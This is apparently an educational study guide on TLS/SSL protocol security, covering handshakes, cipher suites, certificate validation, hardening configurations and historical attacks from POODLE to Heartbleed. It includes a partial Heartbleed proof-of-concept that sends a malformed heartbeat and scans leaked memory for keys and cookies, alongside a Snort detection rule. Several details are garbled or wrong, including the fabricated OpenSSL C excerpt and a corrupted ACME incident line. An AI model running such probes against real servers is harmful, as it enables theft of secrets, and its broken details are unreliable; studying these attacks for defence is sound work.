# TLS/SSL Deep Dive: Protocol Security

## TLS 1.2 Handshake: Cryptographic Foundations

The TLS 1.2 handshake establishes a secure channel through a multi-step negotiation:

```
┌──────────────────────────────────────────────────────────────┐
│                    TLS 1.2 FULL HANDSHAKE                     │
│                                                               │
│  Client                                          Server      │
│    │                                                │          │
│    │ ──── ClientHello ────────────────────────────► │          │
│    │      Random_C, CipherSuites, Extensions         │          │
│    │                                                │          │
│    │ ◄─── ServerHello ───────────────────────────── │          │
│    │      Random_S, SelectedCipher, Extensions       │          │
│    │                                                │          │
│    │ ◄─── Certificate ───────────────────────────── │          │
│    │      Server Certificate Chain                    │          │
│    │                                                │          │
│    │ ◄─── ServerKeyExchange ─────────────────────── │          │
│    │      (DHE/ECDHE parameters + signature)         │          │
│    │                                                │          │
│    │ ◄─── ServerHelloDone ───────────────────────── │          │
│    │                                                │          │
│    │ ──── ClientKeyExchange ──────────────────────► │          │
│    │      (Pre-Master Secret, encrypted with server  │          │
│    │       public key or DH params)                  │          │
│    │                                                │          │
│    │ ──── ChangeCipherSpec ────────────────────────► │          │
│    │                                                │          │
│    │ ──── Finished ───────────────────────────────► │          │
│    │      (Verify data over all handshake msgs)      │          │
│    │                                                │          │
│    │ ◄─── ChangeCipherSpec ──────────────────────── │          │
│    │                                                │          │
│    │ ◄─── Finished ───────────────────────────────── │          │
│    │                                                │          │
│    │ ═══════ Application Data (encrypted) ══════════ │          │
└──────────────────────────────────────────────────────────────┘
```

**Key derivation in TLS 1.2**:
```
master_secret = PRF(pre_master_secret, "master secret",
                    ClientHello.random + ServerHello.random)

key_block = PRF(master_secret, "key expansion",
                ServerHello.random + ClientHello.random)

key_block expands to:
  client_write_MAC_key | server_write_MAC_key
  client_write_key     | server_write_key
  client_write_IV      | server_write_IV
```

## TLS 1.3 Handshake: Modern Security

TLS 1.3 reduces round trips and eliminates insecure options:

```
┌──────────────────────────────────────────────────────────────┐
│                    TLS 1.3 HANDSHAKE                          │
│                                                               │
│  Client                                          Server      │
│    │                                                │          │
│    │ ──── ClientHello ────────────────────────────► │          │
│    │      Random_C, CipherSuites, KeyShare (DH)      │          │
│    │                                                │          │
│    │ ◄─── ServerHello ───────────────────────────── │          │
│    │      Random_S, CipherSuite, KeyShare (DH)       │          │
│    │                                                │          │
│    │ ◄─── {EncryptedExtensions} ──────────────────── │          │
│    │ ◄─── {Certificate} ──────────────────────────── │          │
│    │ ◄─── {CertificateVerify} ───────────────────── │          │
│    │ ◄─── {Finished} ────────────────────────────── │          │
│    │                                                │          │
│    │ ──── {Finished} ──────────────────────────────► │          │
│    │                                                │          │
│    │ ═══════ Application Data (1-RTT!) ═════════════ │          │
└──────────────────────────────────────────────────────────────┘
```

**Critical TLS 1.3 changes**:
- Removed RSA key exchange (forward secrecy mandatory)
- Removed CBC mode ciphers (AEAD only: AES-GCM, ChaCha20-Poly1305)
- Removed SHA-1 from signature algorithms
- Removed compression
- Removed renegotiation
- Removed non-AEAD ciphers
- Added 0-RTT (with replay risk)
- Added HelloRetryRequest for DH group negotiation

**0-RTT replay risk**: TLS 1.3's early data can be replayed. Mitigation requires application-layer replay protection (idempotent requests only, or server-side freshness checks).

## Cipher Suite Analysis

### TLS 1.2 Cipher Suite Structure

```
TLS_DHE_RSA_WITH_AES_256_CBC_SHA384
 │   │   │       │    │    │   │   └── MAC: SHA-384
 │   │   │       │    │    │   └────── Cipher: CBC
 │   │   │       │    │    └────────── Key: 256-bit
 │   │   │       │    └─────────────── Algorithm: AES
 │   │   │       └──────────────────── Auth/RSA sig
 │   │   └──────────────────────────── Key Exchange: DHE
 │   └───────────────────────────────── Protocol: TLS
 └───────────────────────────────────── Version
```

### Cipher Suite Security Classification

| Cipher Suite | Security | Vulnerabilities | Recommendation |
|---|---|---|---|
| `TLS_RSA_WITH_RC4_128_SHA` | **BROKEN** | RC4 biases (CVE-2013-2566) | Never use |
| `TLS_RSA_WITH_AES_128_CBC_SHA` | **WEAK** | No PFS, BEAST | Avoid |
| `TLS_RSA_WITH_AES_256_CBC_SHA` | **WEAK** | No PFS, Lucky13 timing | Avoid |
| `TLS_DHE_RSA_WITH_AES_128_CBC_SHA` | **MARGINAL** | PFS, but CBC timing | Acceptable if no AEAD |
| `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256` | **STRONG** | PFS, AEAD | Acceptable |
| `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384` | **STRONG** | PFS, AEAD | Preferred |
| `TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256` | **STRONG** | PFS, AEAD | Preferred |
| `TLS_AES_128_GCM_SHA256` (TLS 1.3) | **STRONG** | Mandatory PFS, AEAD | Preferred |
| `TLS_AES_256_GCM_SHA384` (TLS 1.3) | **STRONG** | Mandatory PFS, AEAD | Best |

### Forward Secrecy Analysis

Forward secrecy ensures compromise of long-term keys does not compromise past sessions:

```
┌──────────────────────────────────────────────────────┐
│           FORWARD SECRECY COMPARISON                   │
│                                                        │
│  RSA Key Exchange (NO Forward Secrecy):                │
│  master_secret = RSA_decrypt(pre_master_secret)       │
│  └── Compromise of server private key reveals ALL     │
│      past and future sessions                          │
│                                                        │
│  DHE Key Exchange (Forward Secrecy):                   │
│  PMS = (Y_c ^ a mod p) = (Y_s ^ b mod p) = g^ab     │
│  └── Key deleted after handshake; past sessions safe  │
│                                                        │
│  ECDHE Key Exchange (Forward Secrecy + Fast):          │
│  PMS = (Y_c * Y_s) on curve = x-coordinate           │
│  └── Same PFS property, faster computation             │
└──────────────────────────────────────────────────────┘
```

## Certificate Chain Validation

### X.509 Certificate Structure

```
┌─────────────────────────────────────────────────┐
│              X.509 CERTIFICATE                    │
│                                                   │
│  ┌───────Certificate──────┐                      │
│  │ Version: v3             │                      │
│  │ Serial Number           │                      │
│  │ Signature Algorithm     │                      │
│  │ Issuer: CN=IntCA        │                      │
│  │ Validity: Not Before/   │                      │
│  │           Not After     │                      │
│  │ Subject: CN=example.com │                      │
│  │ Subject Public Key Info│                      │
│  │ Extensions:             │                      │
│  │   SAN, KU, EKU, ...    │                      │
│  │                         │                      │
│  │ Signature: IntCA's     │                      │
│  │            signature    │                      │
│  └─────────────────────────┘                      │
│                                                   │
│  Validation Chain:                                │
│  Leaf (example.com)                               │
│    → Intermediate (IntCA)                         │
│      → Root (Trusted Root CA)                     │
│        → Trust Anchor (OS/Browser trust store)    │
└─────────────────────────────────────────────────┘
```

### Certificate Validation Pitfalls

**Chain validation failures** account for a significant portion of TLS vulnerabilities:

1. **Missing intermediate certificates**: Server sends only leaf cert; client cannot build chain
2. **Incorrect chain ordering**: Certs must be leaf → intermediate → root
3. **Expired intermediate**: Chain breaks if intermediate CA cert expires
4. **Cross-signing confusion**: Multiple valid chains exist; validator must select
5. **Name constraint violations**: Intermediate CA exceeds permitted namespaces

```python
from cryptography import x509
from cryptography.hazmat.backends import default_backend

def validate_cert_chain(leaf_cert_pem, intermediates_pem, hostname):
    """Manual certificate chain validation"""
    leaf = x509.load_pem_x509_certificate(leaf_cert_pem, default_backend())
    
    # Verify certificate validity period
    now = datetime.datetime.utcnow()
    if now < leaf.not_valid_before or now > leaf.not_valid_after:
        raise ValueError("Certificate expired or not yet valid")
    
    # Verify hostname matches SAN
    san = leaf.extensions.get_extension_for_class(
        x509.SubjectAlternativeName
    )
    dns_names = san.value.get_values_for_type(x509.DNSName)
    if hostname not in dns_names and not any(
        match_hostname(hostname, pattern) for pattern in dns_names
    ):
        raise ValueError(f"Hostname {hostname} not in certificate SAN")
    
    # Verify key usage
    ku = leaf.extensions.get_extension_for_class(x509.KeyUsage)
    if not ku.value.digital_signature:
        raise ValueError("Certificate missing digitalSignature key usage")
    
    # Build and verify chain (simplified - use proper store)
    # In production: use certvalidator or openssl verify
    pass
```

### OCSP and CRL

```
┌──────────────────────────────────────────────────────────────┐
│              CERTIFICATE REVOCATION CHECKING                   │
│                                                                │
│  CRL (Certificate Revocation List):                            │
│  ┌────────┐    GET /crl.pem    ┌──────────┐                   │
│  │ Client  │ ────────────────► │  CRL DP   │                   │
│  │        │ ◄──────────────── │           │                   │
│  │        │    CRL (often stale, large)                      │
│  └────────┘                                                     │
│                                                                │
│  OCSP (Online Certificate Status Protocol):                    │
│  ┌────────┐    OCSP Request    ┌──────────┐                   │
│  │ Client  │ ────────────────► │OCSP Resp  │                   │
│  │        │ ◄──────────────── │           │                   │
│  │        │    Good/Revoked/Unknown (real-time)              │
│  └────────┘                                                     │
│                                                                │
│  OCSP Stapling (TLS Extension):                                │
│  ┌────────┐                    ┌──────────┐                   │
│  │ Client  │    TLS Hello      │  Server   │  ┌──────────┐  │
│  │        │ ◄── + OCSP Response│           │─►│OCSP Resp │  │
│  └────────┘                    └──────────┘  └──────────┘  │
│                                                                 │
│  Problem: OCSP leaks client browsing to CA (privacy)          │
│  Solution: OCSP stapling (server fetches and staples)          │
│  Problem: CRL/OCSP unavailable = soft fail (connection OK)    │
└──────────────────────────────────────────────────────────────┘
```

**OCSP Must-Staple** (RFC 7633): Extension in certificate requiring OCSP stapling. If server doesn't staple, clients MUST reject.

## HSTS and Certificate Pinning

### HTTP Strict Transport Security (HSTS)

HSTS forces HTTPS connections and prevents TLS stripping:

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

┌───────────────────────────────────────────────────────┐
│                    HSTS OPERATION                      │
│                                                         │
│  1. First visit: Browser receives HSTS header           │
│  2. max-age=63072000: Remember for 2 years            │
│  3. includeSubDomains: Apply to all subdomains          │
│  4. preload: Opt-in to browser HSTS preload list       │
│                                                         │
│  After HSTS is active:                                  │
│  - HTTP URLs auto-converted to HTTPS                    │
│  - Browser REFUSES to connect to HTTP                  │
│  - Click-through on cert errors BLOCKED                 │
│                                                         │
│  BOOTSTRAP PROBLEM:                                    │
│  First connection over HTTP can be sslstripped          │
│  Solution: HSTS Preload List (Chrome, Firefox, etc.)  │
└───────────────────────────────────────────────────────┘
```

### Certificate Pinning

Pinning associates a specific certificate or public key with a connection, bypassing the CA trust model:

```python
# HTTP Public Key Pinning (HPKP) - DEPRECATED (RFC 7469)
# Removed from Chrome 72+ due to operational risk

# Application-level pinning (Android)
class PinningTrustManager implements X509TrustManager {
    private static final String PIN_SHA256 = 
        "sha256/U5A/4sT1OqN3ycFxDQOB0V9J4RMMxRJ3gkpFkEbJQjI=";
    
    @Override
    public void checkServerTrusted(X509Certificate[] chain, String authType) {
        for (X509Certificate cert : chain) {
            String pin = Base64.encodeToString(
                MessageDigest.getInstance("SHA-256").digest(cert.getPublicKey().getEncoded()),
                Base64.NO_WRAP
            );
            if (expectedPin.equals(pin)) return;
        }
        throw new CertificateException("Pin verification failed");
    }
}

# Certificate Transparency (modern alternative to HPKP)
# RFC 6962 - allows public auditing of certificate issuance
# browsers require CT logs for publicly-trusted certs
```

## TLS Downgrade Attacks

### POODLE (CVE-2014-3566)

**Padding Oracle On Downgraded Legacy Encryption**: SSL 3.0's CBC padding is deterministic, enabling decryption:

```
┌────────────────────────────────────────────────────────┐
│                  POODLE ATTACK                           │
│                                                          │
│  SSL 3.0 CBC padding:                                   │
│  [data][MAC][padding][padding_length]                   │
│                                                          │
│  Padding bytes ALL equal padding_length:                │
│  If pad_len=3: ||03|03|03||                             │
│                                                          │
│  For block_size=8: last byte = 0x07                     │
│  Valid padding requires: all pad bytes = last byte      │
│                                                          │
│  Attack:                                                 │
│  1. Force TLS fallback to SSL 3.0                        │
│  2. Manipulate ciphertext to produce valid padding       │
│  3. Each valid padding guess reveals one byte            │
│  4. Over ~256 requests per byte, recover plaintext      │
│                                                          │
│  P(CBC_dec(C_n) XOR C_{n-1} last_byte = pad_len)       │
│  = 1/256 probability per attempt                        │
│                                                          │
│  Mitigation: Disable SSL 3.0 entirely                    │
│  OpenSSL: ssl.min_protocol = TLS1.0+                     │
│  Apache: SSLProtocol all -SSLv2 -SSLv3                  │
└────────────────────────────────────────────────────────┘
```

### FREAK (CVE-2015-0204)

**Factoring RSA Export Keys**: Servers accepting export-grade RSA (512-bit) can be forced into weak key exchange:

1. Client sends `ClientHello` with strong cipher
2. MITM replaces with `RSA_EXPORT` cipher suite
3. Server accepts downgrade
4. Attacker factors the 512-bit export key (feasible in hours)
5. All traffic decryptable

```python
# Export-grade key factoring (512-bit RSA)
# Using CADO-NFS or msieve
# 512-bit RSA factored in ~7 hours on AWS EC2 c4.8xlarge (2015)
# Cost: ~$100 in cloud compute

# OpenSSL configuration to prevent FREAK:
# Do NOT enable export cipher suites
openssl s_client -connect example.com:443 -cipher '!EXPORT'
```

### Logjam (CVE-2015-4000)

**Discrete Logarithm attack on EXPORT-DHE**: Similar to FREAK but targets Diffie-Hellman:

1. 512-bit export DH groups are crackable (Logjam attack)
2. 1024-bit DH groups are at risk from nation-state actors
3. 512-bit DH: factored in minutes
4. 1024-bit DH: estimated $100M computation (within NSA budget per leaked docs)

```
┌────────────────────────────────────────────────────────┐
│               LOGJAM ATTACK FLOW                        │
│                                                          │
│  Client ──── ClientHello (DHE) ──────────► Server       │
│            ◄───── MITM changes to DHE_EXPORT ─────      │
│            ◄───── ServerHello (DHE_EXPORT, 512-bit) ──  │
│            ────── ClientKeyExchange (512-bit DH) ────►   │
│                                                          │
│  MITM: 1. Compute discrete log of 512-bit p (offline)   │
│        2. Derive session keys for export connection       │
│        3. Upgrade connection to regular DHE              │
│        4. Full MITM established                          │
│                                                          │
│  Mitigation:                                             │
│  - Disable export cipher suites                          │
│  - Use 2048+ bit DH groups                              │
│  - Prefer ECDHE over DHE                                 │
│  - Use TLS 1.2+ with strong groups                       │
└────────────────────────────────────────────────────────┘
```

## BEAST, CRIME, and Related Attacks

### BEAST (CVE-2011-3389)

**Browser Exploit Against SSL/TLS**: CBC-mode IV predictability in TLS 1.0:

TLS 1.0 uses implicit IV = last block of previous record (stateful), enabling chosen-plaintext attack:

```
┌────────────────────────────────────────────────────────┐
│                  BEAST ATTACK                            │
│                                                          │
│  TLS 1.0 CBC:                                           │
│  Record 1: IV_1 = random, C_1 = E(IV_1 XOR P_1)       │
│  Record 2: IV_2 = C_1[last block], C_2 = E(C_1 XOR P_2)│
│                                                          │
│  If attacker can control P_2:                           │
│  Guess byte g, set P_2[0] = g XOR IV_2[0] XOR target  │
│  If C_2 matches expected → guess correct                │
│                                                          │
│  Mitigation: 1/n-1 split (send first byte in own record) │
│  OpenSSL: empty fragment (empty record before data)      │
│  Final fix: TLS 1.1+ with explicit IVs                  │
└────────────────────────────────────────────────────────┘
```

### CRIME (CVE-2012-4929)

**Compression Ratio Info-leak Made Easy**: TLS-level compression leaks secrets:

```python
# CRIME attack principle
# When SPDY/TLS compression is enabled:
# compressed_size(secret + attacker_controlled) varies
# based on how much attacker_controlled matches secret

# If cookie = "sessionid=SECRET12345"
# Request 1: "sessionid=SECRET12345" + "A"  → compressed size X
# Request 2: "sessionid=SECRET12345" + "S"  → compressed size X-2 (match!)

# By observing compressed sizes, reveal secret one byte at a time

# Mitigation: Disable TLS compression
# OpenSSL: SSL_OP_NO_COMPRESSION
# Apache: SSLCompression off
# Nginx: gzip off (doesn't affect TLS compression anyway)
```

### BREACH (CVE-2013-3587)

Extends CRIME to HTTP-level compression (gzip/deflate) regardless of TLS compression:

- Targets HTTP response compression
- Works against any compressed HTTP response containing secrets
- Mitigation: Randomized padding, separate secret delivery, disabling compression for sensitive responses

## Heartbleed (CVE-2014-0160)

The most impactful TLS vulnerability in history:

```c
// Vulnerable OpenSSL code (ssl/d1_both.c and ssl/t1_lib.c)

// Heartbeat request processing
int dtls1_process_heartbeat(SSL *s)
{
    unsigned char *p = &s->s3->rrec.data[0];
    unsigned int hbtype = *p++;
    unsigned int payload_len = 2;  // Read from packet
    unsigned int n2s(p, payload_len);  // 16-bit length field
    
    // VULNERABILITY: payload_len is NOT validated against actual data
    // Attacker sends payload_len=65535 with 1 byte of data
    // memcpy reads beyond buffer = 64KB memory leak
    
    unsigned char *pl = p;
    // ...
    buffer = OPENSSL_malloc(1 + 2 + payload_len);
    bp = buffer;
    *bp++ = TLS1_HB_RESPONSE;
    s2n(payload_len, bp);
    memcpy(bp, pl, payload_len);  // OVERREAD: reads payload_len bytes from pl
}
```

```
┌────────────────────────────────────────────────────────┐
│              HEARTBLEED EXPLOIT                          │
│                                                          │
│  Normal:   Heartbeat Request: [type][len=3][abc]        │
│           Heartbeat Response: [type][len=3][abc]        │
│                                                          │
│  Malicious: Heartbeat Request: [type][len=65535][a]    │
│            Heartbeat Response: [type][len=65535]        │
│                                   [a] + 65534 bytes    │
│                                   from process memory  │
│                                                          │
│  Leaked memory may contain:                              │
│  - Private keys (RSA, ECDSA)                            │
│  - Session cookies                                      │
│  - Session tickets                                      │
│  - User credentials                                     │
│  - Internal data structures                             │
│                                                          │
│  Detection: IDS rule for heartbeat request where        │
│  declared length > actual payload length                 │
│                                                          │
│  Impact: ~17% of HTTPS servers affected (2014)          │
│  Patch: OpenSSL 1.0.1g, bounds check added              │
│  Compromise indicator: No logging, silent leak          │
└────────────────────────────────────────────────────────┘
```

```python
# Heartbleed PoC (educational framework)
import socket
import struct

def heartbleed(target, port=443):
    """Send malformed heartbeat request"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    
    # TLS ClientHello with heartbeat extension
    hello = build_client_hello_with_heartbeat()
    s.send(hello)
    s.recv(4096)
    
    # Malformed heartbeat: claim 65535 bytes, send 1 byte
    heartbeat_type = b'\x01'  # request
    payload_length = struct.pack('!H', 65535)  # false length
    payload = b'\x00'  # actual 1-byte payload
    padding = b'\x00' * 16
    
    heartbeat = heartbeat_type + payload_length + payload + padding
    s.send(heartbeat)
    
    response = s.recv(65540)
    leaked = response[3:]  # Skip type and length
    
    # Check for secrets in leaked memory
    search_patterns = [b'PRIVATE KEY', b'SET-COOKIE', b'Authorization']
    for pattern in search_patterns:
        if pattern in leaked:
            print(f"Found {pattern} in leaked memory!")
    
    s.close()

# Snort detection rule:
# alert tcp any any -> any 443 (msg:"Heartbleed Attack"; 
#   content:"|18 03|"; depth:2; content:"|01|"; distance:3; 
#   within:1; byte_test:2,>,64,0,relative; sid:2014:0160;)
```

## Lucky13 (CVE-2013-0169)

Timing side channel in CBC-mode decryption MAC-then-encrypt:

```
┌────────────────────────────────────────────────────────┐
│                LUCKY13 ATTACK                            │
│                                                          │
│  CBC decryption check sequence:                         │
│  1. Decrypt ciphertext                                  │
│  2. Remove padding                                      │
│  3. Compute HMAC over plaintext                          │
│  4. Compare HMAC with received MAC                       │
│                                                          │
│  Timing leak:                                            │
│  - Invalid padding → reject at step 2 (fast)            │
│  - Valid padding, invalid MAC → reject at step 4 (slow)  │
│                                                          │
│  Attacker can distinguish:                               │
│  "Valid padding, wrong MAC" vs "Invalid padding"        │
│                                                          │
│  This Po is a padding oracle!                            │
│  With ~2^23 queries per byte, decrypt entire blocks      │
│                                                          │
│  Mitigation (constant-time):                             │
│  - Always compute MAC even if padding invalid            │
│  - Use constant-time MAC comparison                      │
│  - Use AEAD modes (GCM, ChaCha20-Poly1305)              │
└────────────────────────────────────────────────────────┘
```

## RC4 Biases

RC4 was once the most widely used stream cipher in TLS. It is now completely broken:

```
RC4 Statistical Biases:

Byte position:  1     2     3     4    ...   257   ...
Bias:          +0.005 -0.005 +0.020 -0.010 ...  +0.001

First byte (K[0]): P[S[1]=0] with correlated output
Second byte (K[1]): Strong bias at position 2
SVV_flips (Fluhrer-McGrew): Double-byte biases throughout keystream

Attack: With ~2^26 sessions, recover plaintext using statistical
        biases in RC4 keystream (AlFardan et al., 2013)

CVE-2013-2566: RC4 bias vulnerabilities
CVE-2015-2808: Bar-Mitzvah attack (RC4 decrypt in ~2^24 hours)
```

## Renegotiation Attacks

### TLS Renegotiation Vulnerability (CVE-2009-3555)

```
┌────────────────────────────────────────────────────────┐
│          TLS RENEGOTIATION ATTACK                       │
│                                                          │
│  Attacker ──── ClientHello ───────────────► Server      │
│  Attacker ── "GET /evil HTTP/1.1\r\nX: "                 │
│  Attacker ──── [Inject prefix] ──────────►                │
│                                                          │
│  (Legitimate client renegotiates TLS)                    │
│  Client   ◄────── Full TLS Handshake ───────── Server    │
│  Client   ──── "GET /legitimate HTTP/1.1\r\nCookie: ..."  │
│                                                          │
│  Server sees combined request:                           │
│  "GET /evil HTTP/1.1\r\nX: GET /legitimate HTTP/1.1     │
│   \r\nCookie: secret=admin"                              │
│                                                          │
│  HTTP injection! Attacker prefix + client request        │
│                                                          │
│  Fix: TLS Renegotiation Indication Extension (RFC 5746)  │
│  Client sends verify_data from previous handshake        │
│  Server validates continuity of renegotiation            │
└────────────────────────────────────────────────────────┘
```

## TLS Stripping (sslstrip)

### sslstrip Attack (Moxie Marlinspike, 2009)

```
┌────────────────────────────────────────────────────────┐
│                 SSLSTRIP ATTACK                          │
│                                                          │
│  User ────────── Attacker ────────── Server             │
│   HTTP              MITM               HTTPS             │
│                                                          │
│  1. User requests http://example.com                    │
│     Attacker → Server: https://example.com             │
│                                                          │
│  2. Server responds with:                                │
│     <a href="https://secure.example.com/login">         │
│     Attacker rewrites to:                                │
│     <a href="http://secure.example.com/login">           │
│     (removes https, adds favicons, modifies redirects)  │
│                                                          │
│  3. User submits credentials over HTTP                  │
│     Attacker forwards to server over HTTPS              │
│                                                          │
│  MITM reads all credentials in cleartext!               │
│                                                          │
│  Mitigation: HSTS, HTTPS-only, preload lists             │
│  See: 01b HSTS section above                            │
└────────────────────────────────────────────────────────┘
```

### STARTTLS Injection

```
┌────────────────────────────────────────────────────────┐
│              STARTTLS INJECTION                          │
│                                                          │
│  SMTP STARTTLS:                                          │
│  C: STARTTLS\r\n                                         │
│  S: 220 Ready for TLS\r\n                               │
│  [TLS handshake begins]                                  │
│                                                          │
│  Attack: Inject commands before STARTTLS completes       │
│                                                          │
│  C: STARTTLS\r\n                                         │
│  C: [inject] EHLO attacker.com\r\n   ← pipelined        │
│  S: 220 Ready for TLS\r\n                                │
│      → Second command processed BEFORE TLS               │
│                                                          │
│  Variants:                                                │
│  - SMTP command injection via pipelining                 │
│  - IMAP/POP3 PREAUTH bypass                              │
│  - FTP AUTH TLS command injection                         │
│                                                          │
│  CVE-2011-0411: Postfix STARTTLS command injection      │
│  CVE-2011-4939: Exim STARTTLS command injection          │
└────────────────────────────────────────────────────────┘
```

## Mutual TLS (mTLS)

```
┌────────────────────────────────────────────────────────┐
│                  mTLS AUTHENTICATION                     │
│                                                          │
│  Client                                          Server │
│    │                                                │     │
│    │ ──── ClientHello ────────────────────────────► │     │
│    │ ◄─── ServerHello + CertificateRequest ─────── │     │
│    │ ◄─── Certificate + ServerKeyExchange ──────── │     │
│    │                                                │     │
│    │ ──── Certificate (client cert) ──────────────► │     │
│    │ ──── CertificateVerify (signed) ─────────────► │     │
│    │      (Proves possession of client private key) │     │
│    │                                                │     │
│    │ ◄─── Server verifies client certificate ──── │     │
│    │      (Checks chain, CRL/OCSP, EKU, policies) │     │
│    │                                                │     │
│    │ ══════ Mutual authentication established ══════ │     │
│                                                        │
│  Use cases:                                             │
│  - Service mesh (Istio, Linkerd)                        │
│  - Zero-trust networking (see 01a, 05b)                 │
│  - API authentication (replacing API keys)              │
│  - Kubernetes pod-to-pod authentication                 │
│                                                        │
│  Security considerations:                               │
│  - Client cert management overhead                      │
│  - Revocation is hard (CRL/OCSP scalability)            │
│  - Certificate rotation (short-lived certs preferred)  │
│  - SPIRE/SPIFFE for automated workload identity          │
└────────────────────────────────────────────────────────┘
```

## ACME and Let's Encrypt Security

### ACME Protocol (RFC 8555)

The Automatic Certificate Management Environment automates certificate issuance:

```
┌────────────────────────────────────────────────────────┐
│                 ACME PROTOCOL FLOW                       │
│                                                          │
│  Client                                          CA     │
│    │                                                │     │
│    │ ──── POST /acme/new-nonce ──────────────────► │     │
│    │ ◄─── Replay-Nonce ───────────────────────── │     │
│    │                                                │     │
│    │ ──── POST /acme/new-account (JWS signed) ───► │     │
│    │ ◄─── Account URL ────────────────────────── │     │
│    │                                                │     │
│    │ ──── POST /acme/new-order ──────────────────► │     │
│    │ ◄─── Order + Challenges ─────────────────── │     │
│    │                                                │     │
│    │ ──── Fulfill challenge (HTTP-01, DNS-01,     │     │
│    │      TLS-ALPN-01) by provisioning response    │     │
│    │                                                │     │
│    │ ──── POST /acme/challenge/xxx (indicate ready)► │     │
│    │ ◄─── Challenge status: valid ─────────────── │     │
│    │                                                │     │
│    │ ──── POST /acme/finalize (CSR) ────────────► │     │
│    │ ◄─── Certificate URL ─────────────────────── │     │
│    │                                                │     │
│    │ ──── GET /acme/cert/xxx ────────────────────► │     │
│    │ ◄─── Certificate (PEM) ─────────────────── │     │
└────────────────────────────────────────────────────────┘
```

**ACME Security Considerations**:

1. **HTTP-01 challenges**: Vulnerable to BGP hijacking and DNSSpoofing (see `02a_dns_security.md`)
2. **DNS-01 challenges**: Vulnerable to DNS hijacking; TXT record must be placed at `_acme-challenge.domain`
3. **TLS-ALPN-01**: Uses self-signed cert with special OCSP; more secure than HTTP-01
4. **Account key compromise**: Allows unauthorized certificate issuance
5. **Domain validation bypass**: ACME does not validate organizational identity (only domain control)

**Notable ACME/Let's Encrypt incidents**:
- **2020 CAA rechecking bug**: Let's Encrypt failed to re-check CAA records; revoked ~3M certificates
- **2021 hn很短 challenge bypass**: Malicious domains could satisfy challenges via symlink
- **OCSP Must-Staple**: Let's Encrypt includes extension; misconfigured servers can cause outages

## TLS Fingerprinting and Countermeasures

### JA3/JA3S Fingerprinting

```
┌────────────────────────────────────────────────────────┐
│              JA3 FINGERPRINTING                         │
│                                                          │
│  JA3 = MD5(TLSVersion, CipherSuites, Extensions,       │
│            EllipticCurves, PointFormats)                 │
│                                                          │
│  Example:                                                │
│  JA3=769,47,0-5-10-11-...,769,47-48-49-...,0-23-24,...│
│  → MD5 hash: a0f23e2afeb02c91ee3a188b23f5914a           │
│                                                          │
│  Uses:                                                   │
│  - Detect malware C2 (specific JA3 fingerprints)         │
│  - Block unauthorized TLS clients                        │
│  - Identify applications behind DNS over HTTPS          │
│                                                          │
│  Countermeasures:                                        │
│  - JA3 randomization (uTLS, cloaked TLS)                │
│  - Grease values (RFC 8701)                             │
│  - TLS 1.3 reduces fingerprinting surface                │
└────────────────────────────────────────────────────────┘
```

### ESCS Configuration Best Practices

```nginx
# Nginx TLS hardening configuration
ssl_protocols TLSv1.2 TLSv1.3;
ssl_prefer_server_ciphers on;
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384';
ssl_ecdh_curve secp384r1:X25519;
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:50m;
ssl_session_tickets off;  # Forward secrecy for session resumption
ssl_stapling on;          # OCSP stapling
ssl_stapling_verify on;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

# TLS 1.3 specific
ssl_conf_command Ciphersuites TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256;
```

```bash
# Test TLS configuration
openssl s_client -connect example.com:443 -tls1_3
nmap --script ssl-enum-ciphers -p 443 example.com
sslyze --regular example.com
testssl.sh example.com
```

**Cross-references**: See `02a_dns_security.md` for DNS security impacting TLS (DANE, CAA), `04a_network_attacks_mitm.md` for MITM techniques targeting TLS, `05a_firewall_ids_ips.md` for TLS inspection challenges, and Cloud Security track for cloud TLS termination patterns.

## References

1. RFC 8446 — The Transport Layer Security (TLS) Protocol Version 1.3. E. Rescorla, IETF, August 2018.
2. RFC 5246 — The Transport Layer Security (TLS) Protocol Version 1.2. T. Dierks, E. Rescorla, IETF, August 2008.
3. CVE-2014-0160 — OpenSSL Heartbleed information disclosure. NVD, 2014.
4. CVE-2014-3566 — POODLE: SSL 3.0 CBC padding oracle attack. NVD, 2014.
5. Möller, B., Duong, T., Kotowicz, K. — This POODLE Bites: Exploiting the SSL 3.0 Fallback. Google Security Advisory, October 2014.
6. CVE-2015-0204 — FREAK: Factoring RSA Export Keys. NVD, 2015.
7. CVE-2015-4000 — Logjam: Diffie-Hellman export-grade downgrade attack. NVD, 2015.
8. Adrian, D. et al. — Imperfect Forward Secrecy: How Diffie-Hellman Fails in Practice. ACM CCS 2015.
9. CVE-2011-3389 — BEAST: Browser Exploit Against SSL/TLS. NVD, 2011.
10. Duong, T., Rizzo, J. — Here Come The XOR Ninja (BEAST). Ekoparty, 2011.
11. CVE-2012-4929 — CRIME: Compression Ratio Info-leak Made Easy. NVD, 2012.
12. CVE-2013-3587 — BREACH: Browser Reconnaissance and Exfiltration via Adaptive Compression. NVD, 2013.
13. CVE-2013-0169 — Lucky13: Timing side channel in CBC-mode TLS decryption. NVD, 2013.
14. AlFardan, N., Paterson, K. — Plaintext-Recovery Attacks Against Datagram TLS. IEEE S&P 2013.
15. CVE-2013-2566 — RC4 statistical biases in TLS. NVD, 2013.
16. CVE-2015-2808 — Bar-Mitzvah attack on RC4. NVD, 2015.
17. CVE-2009-3555 — TLS renegotiation vulnerability. NVD, 2009.
18. RFC 5746 — Secure Renegotiation Extension for TLS. E. Rescorla et al., IETF, February 2010.
19. Marlinspike, M. — New Tricks for Defeating SSL in Practice. Black Hat DC, 2009.
20. RFC 7633 — X.509 Certificate Extension for OCSP Must-Staple. P. Hallam-Baker, IETF, September 2015.
21. RFC 6962 — Certificate Transparency. B. Laurie et al., IETF, June 2013.
22. RFC 8555 — ACME: Automatic Certificate Management Environment. R. Barnes et al., IETF, March 2019.
